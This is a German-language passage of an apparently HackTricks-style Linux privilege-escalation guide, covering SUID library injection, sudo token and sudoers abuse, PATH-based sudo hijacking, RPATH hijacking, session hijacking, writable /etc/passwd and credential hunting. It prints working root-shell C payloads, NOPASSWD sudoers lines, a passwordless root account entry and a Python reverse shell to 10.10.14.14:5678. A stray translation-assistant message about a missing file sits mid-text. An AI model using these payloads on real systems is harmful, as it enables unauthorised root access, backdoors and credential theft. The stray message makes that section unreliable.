### SUID-Binärdatei – .so injection

Wenn Sie auf eine Binärdatei mit **SUID**-Rechten stoßen, die ungewöhnlich erscheint, ist es gute Praxis zu prüfen, ob sie **.so**-Dateien korrekt lädt. Dies lässt sich überprüfen, indem der folgende Befehl ausgeführt wird:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf eine mögliche Ausnutzbarkeit hin.

Um dies auszunutzen, würde man vorgehen, indem man eine C-Datei erstellt, z. B. _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code versucht, nach Kompilierung und Ausführung, Privilegien zu erhöhen, indem er Dateiberechtigungen manipuliert und eine Shell mit erhöhten Rechten startet.

Kompiliere die obige C-Datei in eine shared object (.so)-Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen des betroffenen SUID binary den exploit auslösen und eine mögliche Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine library aus einem Ordner lädt, in den wir schreiben können, erstellen wir die library in diesem Ordner mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Das bedeutet, dass die von dir erzeugte Bibliothek eine Funktion mit dem Namen `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du **nur Argumente** in einen Befehl injizieren kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um eingeschränkte Shells zu verlassen, Privilegien zu eskalieren oder beizubehalten, Dateien zu übertragen, bind and reverse shells zu erzeugen und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du Zugriff auf `sudo -l` hast, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es aufzeigt, wie sich eine sudo-Regel ausnutzen lässt.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo access** aber nicht das Passwort hast, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Befehls wartest und dann das Session-Token kaperst**.

Voraussetzungen zur Eskalation von Privilegien:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` genutzt**, um in den **letzten 15 Minuten** etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` zu verwenden, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend aktivieren mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` oder dauerhaft, indem du `/etc/sysctl.d/10-ptrace.conf` modifizierst und `kernel.yama.ptrace_scope = 0` setzt)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erzeugt das Binary `activate_sudo_token` in _/tmp_. Du kannst es verwenden, um **den sudo-Token in deiner Sitzung zu aktivieren** (du erhältst nicht automatisch eine root-Shell; führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) wird eine sh shell in _/tmp_ erstellen, die **root gehört und setuid gesetzt ist**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird **eine sudoers file erstellen**, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **Schreibrechte** im Ordner oder für eine der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **einen sudo token für einen Benutzer und eine PID zu erstellen**.\
Zum Beispiel, wenn du die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser Benutzer mit PID 1234 hast, kannst du **sudo privileges** erhalten, ohne das Passwort zu kennen, indem du:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien im Verzeichnis `/etc/sudoers.d` legen fest, wer `sudo` nutzen kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du irgendeine Datei **schreiben** kannst, wirst du in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn Sie Schreibzugriff haben, können Sie diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur `sudo`-Binärdatei, wie z. B. `doas` für OpenBSD. Prüfe dessen Konfiguration unter `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **Benutzer sich normalerweise an einer Maschine anmeldet und `sudo` benutzt**, um Privilegien zu erhöhen, und du eine Shell in diesem Benutzerkontext erhalten hast, kannst du **ein neues sudo executable** erstellen, das zuerst deinen Code als root und danach den Befehl des Benutzers ausführt. Anschließend **ändere den $PATH** des Benutzerkontexts (zum Beispiel indem du den neuen Pfad in .bash_profile hinzufügst), sodass beim Ausführen von sudo dein sudo executable gestartet wird.

Beachte, dass du, falls der Benutzer eine andere Shell (nicht bash) verwendet, andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel modifiziert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder indem du so etwas ausführst:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gemeinsame Library

### ld.so

Die Datei `/etc/ld.so.conf` gibt an **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **libraries** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach libraries im Verzeichnis `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einen der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, eine Datei innerhalb von `/etc/ld.so.conf.d/` oder einen Ordner, auf den in den Konfigurationsdateien unter `/etc/ld.so.conf.d/*.conf` verwiesen wird, kann er möglicherweise escalate privileges.\
Siehe **how to exploit this misconfiguration** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Wenn man die Bibliothek in `/var/tmp/flag15/` kopiert, wird sie vom Programm an dieser Stelle verwendet, wie in der `RPATH`-Variablen angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities bieten einem Prozess eine **Teilmenge der verfügbaren root-Privilegien**. Dies teilt effektiv die root **Privilegien in kleinere und unterscheidbare Einheiten**. Jede dieser Einheiten kann dann unabhängig Prozessen zugewiesen werden. Auf diese Weise wird die Gesamtheit der Privilegien reduziert, wodurch das Risiko einer Ausnutzung sinkt.\
Lese die folgende Seite, um **mehr über capabilities und wie man sie missbraucht** zu erfahren:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betroffene Benutzer mit "**cd**" in den Ordner wechseln kann.\
Das **"read"**-Bit bedeutet, dass der Benutzer die **Dateien** auflisten kann, und das **"write"**-Bit bedeutet, dass der Benutzer **Dateien** löschen und neu erstellen kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der diskretionären Berechtigungen dar und sind in der Lage, **die traditionellen ugo/rwx-Berechtigungen zu überschreiben**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Granularität sorgt für präzisere Zugriffskontrolle**. Weitere Details finden Sie [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibberechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Abrufen** von Dateien mit bestimmten ACLs im System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Versteckte ACL-Backdoor in sudoers drop-ins

Eine häufige Fehlkonfiguration ist eine root-owned Datei in `/etc/sudoers.d/` mit Modus `440`, die einem low-priv user über ACL weiterhin Schreibzugriff gewährt.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Wenn Sie etwas wie `user:alice:rw-` sehen, kann der Benutzer trotz restriktiver Mode-Bits eine sudo-Regel anhängen:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Dies ist ein ACL persistence/privesc-Pfad mit hoher Auswirkung, da er bei reinen `ls -l`-Überprüfungen leicht übersehen wird.

## Offene shell sessions

In **älteren Versionen** kannst du möglicherweise eine **shell** session eines anderen Nutzers (**root**) **hijack**.\
In **neuesten Versionen** kannst du nur noch **connect** zu screen sessions deines **eigenen Nutzers**. Allerdings könntest du **interessante Informationen innerhalb der session** finden.

### screen sessions hijacking

**screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**An eine session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem mit **älteren tmux-Versionen**. Ich konnte eine von root erstellte tmux (v2.1) Session als nicht-privilegierter Benutzer nicht hijacken.

**tmux-Sitzungen auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe **Valentine box von HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, könnten von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erstellen eines neuen ssh-Schlüssels in diesen OS auf, da **nur 32.768 Varianten möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn Sie den ssh public key haben, können Sie nach dem entsprechenden privaten Schlüssel suchen**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Gibt an, ob Passwort-Authentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Gibt an, ob Public-Key-Authentifizierung erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, gibt es an, ob der Server Login zu Konten mit leeren Passwörtern erlaubt. Der Standard ist `no`.

### Login control files

Diese Dateien beeinflussen, wer sich einloggen kann und wie:

- **`/etc/nologin`**: if present, blocks non-root logins and prints its message.
- **`/etc/securetty`**: beschränkt, von wo sich root anmelden kann (TTY Allowlist).
- **`/etc/motd`**: Post-Login-Banner (kann Umgebungs- oder Wartungsdetails leak).

### PermitRootLogin

Gibt an, ob sich root per ssh anmelden kann, Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und private key anmelden
- `without-password` or `prohibit-password`: root kann sich nur mit einem privaten Schlüssel anmelden
- `forced-commands-only`: Root kann sich nur mit privatem Schlüssel anmelden und nur, wenn die commands-Optionen angegeben sind
- `no` : nicht erlaubt

### AuthorizedKeysFile

Gibt Dateien an, die die public keys enthalten, die für die Benutzerauthentifizierung verwendet werden können. Es kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn du versuchst, dich mit dem **private** key des Benutzers "**testusername**" anzumelden, ssh den public key deines Schlüssels mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es dir, **use your local SSH keys instead of leaving keys** (without passphrases!) auf deinem Server liegen zu lassen. Dadurch kannst du via ssh **jump** **to a host** und dich von dort **jump to another** host verbinden, **using** den **key** in deinem **initial host**.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` auf `*` steht, jedes Mal wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host Zugriff auf die Schlüssel haben wird (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard: erlauben).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise ausnutzen kannst, um Privilegien zu eskalieren**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du irgendeine von ihnen **schreiben oder ändern kannst, kannst du Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profile-Skript gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd/Shadow Files

Je nach OS können die `/etc/passwd` und `/etc/shadow` Dateien einen anderen Namen haben oder es können Backups existieren. Daher empfiehlt es sich, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In manchen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder in einer äquivalenten Datei).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbares /etc/passwd

Erzeuge zunächst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ich habe die Datei src/linux-hardening/privilege-escalation/README.md nicht erhalten. Bitte füge den Inhalt der Datei hier ein, dann übersetze ich den relevanten englischen Text ins Deutsche (Markdown/HTML-Syntax bleibt unverändert) und füge am Ende eine Sektion hinzu, die den Benutzer `hacker` anlegt und ein generiertes Passwort enthält. Soll das Passwort in einem Codeblock stehen?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den Befehl `su` mit `hacker:hacker` verwenden

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Dadurch kann die aktuelle Sicherheit der Maschine beeinträchtigt werden.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Sie sollten prüfen, ob Sie in einige sensible Dateien **schreiben** können. Zum Beispiel: Können Sie in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server betreibt und du **modify the Tomcat service configuration file inside /etc/systemd/,** dann kannst du die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich kannst du den letzten nicht lesen, aber versuche es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ungewöhnlicher Speicherort/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binaries im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die passwords enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), es durchsucht nach **mehreren möglichen Dateien, die passwords enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür nutzen kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — eine Open-Source-Anwendung, mit der viele passwords abgerufen werden können, die auf einem lokalen Computer für Windows, Linux & Mac gespeichert sind.

### Logs

Wenn du Logs lesen kannst, könntest du **interessante/vertrauliche Informationen darin** finden. Je seltsamer der Log ist, desto interessanter wird er wahrscheinlich sein.\
Außerdem können einige **schlecht** konfigurierte (backdoored?) **audit logs** es ermöglichen, **passwords** innerhalb der audit logs aufzuzeichnen, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um Logs zu lesen, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generische Creds-Suche/Regex

Du solltest außerdem nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und auch nach IPs und E‑Mails in Logs oder Hashes‑Regexps.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn du interessiert bist, kannst du dir die letzten Checks ansehen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, von **wo** ein python‑Skript ausgeführt wird und du **in diesen Ordner schreiben kannst** oder du **modify python libraries** kannst, kannst du die OS library modifizieren und backdoor it (wenn du dort schreiben kannst, wo das python‑Skript ausgeführt wird, kopiere und füge die os.py library ein).

To **backdoor the library** just add at the end of the os.py library the following line (ändere IP und PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Ausnutzung von logrotate

Eine Schwachstelle in `logrotate` erlaubt Benutzern mit **Schreibrechten** auf eine Log-Datei oder deren übergeordnete Verzeichnisse potenziell erhöhte Privilegien zu erlangen. Das liegt daran, dass `logrotate`, das oft als **root** läuft, so manipuliert werden kann, dass es beliebige Dateien ausführt, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Log-Rotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Mehr Informationen zur Schwachstelle finden sich auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** daher sollten Sie, wann immer Sie feststellen, dass Sie Logs verändern können, prüfen, wer diese Logs verwaltet, und ob Sie Privilegien eskalieren können, indem Sie die Logs durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz der Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer ein `ifcf-<whatever>`-Skript in _/etc/sysconfig/network-scripts_ **schreiben** oder ein bestehendes **anpassen** kann, dann ist Ihr **System pwned**.

Network-Skripte, _ifcg-eth0_ zum Beispiel, werden für Netzwerkverbindungen verwendet. Sie sehen exakt wie .INI-Dateien aus. Sie werden jedoch auf Linux von Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das `NAME=`-Attribut in diesen Netzwerk-Skripten nicht korrekt behandelt. Wenn Sie **Leerzeichen im Namen haben, versucht das System, den Teil nach dem Leerzeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis: das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, und rc.d**

Das Verzeichnis `/etc/init.d` ist die Heimat von **Skripten** für System V init (SysVinit), dem **klassischen Linux-Service-Management-System**. Es enthält Skripte, um Dienste zu `start`, `stop`, `restart` und manchmal `reload`. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad bei Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Management-Aufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte weiterhin neben Upstart-Konfigurationen genutzt, da Upstart eine Kompatibilitätsschicht bietet.

